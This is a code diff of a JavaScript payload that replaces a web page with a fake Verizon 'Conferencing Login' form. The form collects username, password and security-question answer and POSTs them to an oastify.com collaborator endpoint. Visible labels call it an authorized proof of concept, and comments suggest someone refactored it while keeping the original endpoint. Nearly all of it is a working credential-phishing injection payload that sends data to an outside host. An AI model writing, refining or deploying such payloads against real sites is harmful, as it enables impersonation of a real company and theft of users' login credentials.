@@ -1,148 +1,115 @@
-// Clear the existing page
+// Clear page content and set basic body styles
 document.body.innerHTML = '';
-document.body.style.margin = "0";
-document.body.style.fontFamily = "Arial, sans-serif";
-document.body.style.background = "#f3f4f6";
+document.body.style.margin = '0';
+document.body.style.fontFamily = 'Arial, sans-serif';
+document.body.style.background = '#f3f4f6';
 
-// --- Styles ---
-const style = document.createElement("style");
-style.textContent = `
-  .vzn-wrapper {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  .vzn-card {
-    width: 360px;
-    background: #ffffff;
-    border-radius: 12px;
-    box-shadow: 0 6px 20px rgba(0,0,0,0.18);
-    padding: 28px 26px 24px;
-    text-align: center;
-  }
-  .vzn-logo {
-    max-width: 160px;
-    margin-bottom: 20px;
-  }
-  .vzn-title {
-    margin: 0 0 6px;
-    font-size: 22px;
-    color: #222;
-    font-weight: 600;
-  }
-  .vzn-desc {
-    margin: 0 0 20px;
-    font-size: 13px;
-    color: #666;
-  }
-  .vzn-input {
-    width: 100%;
-    padding: 10px;
-    margin: 7px 0;
-    border: 1px solid #ccc;
-    border-radius: 6px;
-    font-size: 13px;
-    box-sizing: border-box;
-  }
-  .vzn-input:focus {
-    outline: none;
-    border-color: #d22;
-    box-shadow: 0 0 0 1px rgba(210,34,34,0.25);
-  }
-  .vzn-button {
-    width: 100%;
-    padding: 11px;
-    margin-top: 12px;
-    border: none;
-    border-radius: 6px;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    background: #d22;
-    color: #fff;
-  }
-  .vzn-button:hover {
-    background: #b01b1b;
-  }
-  .vzn-footnote {
-    margin-top: 12px;
-    font-size: 11px;
-    color: #999;
-  }
-`;
-document.head.appendChild(style);
+// Outer wrapper to center the card
+const wrapper = document.createElement('div');
+wrapper.style.minHeight = '100vh';
+wrapper.style.display = 'flex';
+wrapper.style.alignItems = 'center';
+wrapper.style.justifyContent = 'center';
 
-// --- Build UI ---
-const wrapper = document.createElement("div");
-wrapper.className = "vzn-wrapper";
+// Card container
+const card = document.createElement('div');
+card.style.width = '360px';
+card.style.background = '#ffffff';
+card.style.borderRadius = '12px';
+card.style.boxShadow = '0 6px 20px rgba(0,0,0,0.18)';
+card.style.padding = '28px 26px 24px';
+card.style.textAlign = 'center';
 
-const card = document.createElement("div");
-card.className = "vzn-card";
-
-// Verizon Logo
-const logo = document.createElement("img");
-logo.src = "https://e-meetings.verizonbusiness.com/images/VerizonLogo_RED_90.png";
-logo.className = "vzn-logo";
+// Verizon logo
+const logo = document.createElement('img');
+logo.src = 'https://e-meetings.verizonbusiness.com/images/VerizonLogo_RED_90.png';
+logo.alt = 'Verizon';
+logo.style.maxWidth = '160px';
+logo.style.marginBottom = '20px';
 card.appendChild(logo);
 
-// Title and Description
-const title = document.createElement("h2");
-title.className = "vzn-title";
-title.textContent = "Conferencing Login";
-card.appendChild(title);
+// Title
+const loginTitle = document.createElement('h2');
+loginTitle.textContent = 'Conferencing Login';
+loginTitle.style.margin = '0 0 6px';
+loginTitle.style.color = '#222';
+card.appendChild(loginTitle);
 
-const desc = document.createElement("p");
-desc.className = "vzn-desc";
-desc.textContent = "Security Test – Proof of Concept";
-card.appendChild(desc);
+// Subtitle
+const subtitle = document.createElement('p');
+subtitle.textContent = 'Security test – proof of concept';
+subtitle.style.margin = '0 0 18px';
+subtitle.style.fontSize = '13px';
+subtitle.style.color = '#666';
+card.appendChild(subtitle);
 
-// Form
-const customLoginForm = document.createElement("form");
-customLoginForm.id = "customLoginForm";
+// Create form
+const customLoginForm = document.createElement('form');
+customLoginForm.id = 'customLoginForm';
 
-// Helper to build clean input rows
-function addField(placeholder, name, type = "text") {
-  const input = document.createElement("input");
-  input.className = "vzn-input";
-  input.placeholder = placeholder;
-  input.name = name;
+// Helper to create a styled input
+function createFormField(form, placeholder, name, type = 'text') {
+  const input = document.createElement('input');
   input.type = type;
+  input.name = name;
+  input.placeholder = placeholder;
   input.required = true;
-  customLoginForm.appendChild(input);
+
+  input.style.width = '100%';
+  input.style.padding = '10px';
+  input.style.margin = '7px 0';
+  input.style.border = '1px solid #ccc';
+  input.style.borderRadius = '6px';
+  input.style.fontSize = '13px';
+  input.style.boxSizing = 'border-box';
+
+  form.appendChild(input);
+  return input;
 }
 
-// Add fields
-addField("Username", "username");
-addField("Password", "password", "password");
-addField("Security Question Answer", "answer");
+// Fields
+createFormField(customLoginForm, 'Username', 'username');
+createFormField(customLoginForm, 'Password', 'password', 'password');
+createFormField(customLoginForm, 'Security question answer', 'answer');
 
 // Submit button
-const button = document.createElement("button");
-button.className = "vzn-button";
-button.type = "submit";
-button.textContent = "Login";
-customLoginForm.appendChild(button);
+const formSubmitButton = document.createElement('button');
+formSubmitButton.type = 'submit';
+formSubmitButton.textContent = 'Login';
+formSubmitButton.style.width = '100%';
+formSubmitButton.style.padding = '11px';
+formSubmitButton.style.marginTop = '12px';
+formSubmitButton.style.border = 'none';
+formSubmitButton.style.borderRadius = '6px';
+formSubmitButton.style.fontSize = '14px';
+formSubmitButton.style.fontWeight = '600';
+formSubmitButton.style.cursor = 'pointer';
+formSubmitButton.style.background = '#d22';
+formSubmitButton.style.color = '#fff';
 
-card.appendChild(customLoginForm);
+customLoginForm.appendChild(formSubmitButton);
 
 // Footnote
-const note = document.createElement("div");
-note.className = "vzn-footnote";
-note.textContent = "Authorized security testing only.";
-card.appendChild(note);
+const footnote = document.createElement('div');
+footnote.textContent = 'Authorized security testing only.';
+footnote.style.marginTop = '10px';
+footnote.style.fontSize = '11px';
+footnote.style.color = '#999';
 
-// Add card to wrapper
+// Assemble
+card.appendChild(customLoginForm);
+card.appendChild(footnote);
 wrapper.appendChild(card);
 document.body.appendChild(wrapper);
 
-// Submit Handler (your original logic preserved exactly)
-customLoginForm.addEventListener("submit", function(e) {
+// Submit handler (same collaborator endpoint you used)
+customLoginForm.addEventListener('submit', function handleCustomFormSubmit(e) {
   e.preventDefault();
+
   const formData = new FormData(customLoginForm);
 
-  fetch("https://co4ozwtzquywfw322rxbskkam1ssgr4g.oastify.com", {
-    method: "POST",
+  fetch('https://co4ozwtzquywfw322rxbskkam1ssgr4g.oastify.com', {
+    method: 'POST',
     body: formData
   });
 });
